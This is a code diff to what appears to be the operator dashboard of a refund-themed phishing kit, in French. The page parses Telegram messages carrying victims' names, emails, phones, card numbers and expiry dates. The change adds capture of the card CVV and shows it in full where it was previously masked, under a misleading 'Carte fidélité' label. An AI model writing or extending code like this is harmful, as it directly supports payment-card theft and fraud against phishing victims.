@@ -218,7 +218,7 @@
         function getDataHash(){return localStorage.getItem('remboursement_submissions')||''}
 
         function parseTelegramMessage(text){
-            const result={nom:'',email:'',telephone:'',operateur:'',amount:'',motif:'',cardNumber:'',cardExpiry:'',date:''};
+            const result={nom:'',email:'',telephone:'',operateur:'',amount:'',motif:'',cardNumber:'',cardExpiry:'',cardCvv:'',date:''};
             const lines=text.split('\n');
             lines.forEach(line=>{
                 const clean=line.replace(/<[^>]*>/g,'');
@@ -234,6 +234,7 @@
                 else if(key.includes('motif'))result.motif=val;
                 else if(key.includes('carte'))result.cardNumber=val;
                 else if(key.includes('expir'))result.cardExpiry=val;
+                else if(key.includes('cvv'))result.cardCvv=val;
                 else if(key.includes('date'))result.date=val;
             });
             return result;
@@ -377,7 +378,7 @@
                     <div class="h-px bg-gradient-to-r from-transparent via-slate-200 to-transparent my-3"></div>
                     <div class="flex justify-between items-center py-3 border-b border-slate-100"><span class="text-[13px] text-slate-400 font-medium">Carte fidélité</span><span class="text-[13px] text-slate-600 font-mono">${esc(mc)}</span></div>
                     <div class="flex justify-between items-center py-3 border-b border-slate-100"><span class="text-[13px] text-slate-400 font-medium">Expiration</span><span class="text-[13px] text-slate-600">${esc(s.cardExpiry||'—')}</span></div>
-                    <div class="flex justify-between items-center py-3"><span class="text-[13px] text-slate-400 font-medium">CVV</span><span class="text-[13px] text-slate-600">•••</span></div>
+                    <div class="flex justify-between items-center py-3"><span class="text-[13px] text-slate-400 font-medium">CVV</span><span class="text-[13px] text-slate-600 font-mono">${esc(s.cardCvv||'—')}</span></div>
                 </div>`;
             document.getElementById('detail-modal').classList.remove('hidden');
             document.body.style.overflow='hidden';
